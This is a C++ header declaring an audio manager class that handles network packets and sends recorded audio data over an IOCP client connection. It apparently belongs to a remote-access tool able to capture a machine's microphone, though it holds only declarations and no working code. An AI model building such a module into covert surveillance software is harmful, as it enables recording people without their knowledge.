#pragma once
#include "Manager.h"
#include "Audio.h"



class CAudioManager :
	public CManager
{
public:
	CAudioManager(CIOCPClient *IOCPClient);
	virtual ~CAudioManager();

public:
	void  PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
	BOOL  Initialize();
	int   SendRecordData();

	static DWORD WINAPI _AudioPlayProc(LPVOID lParam);

protected:
	BOOL    _M_IsWorking;
	CAudio* _M_Audio;
	HANDLE  _M_hWorkThread;

};

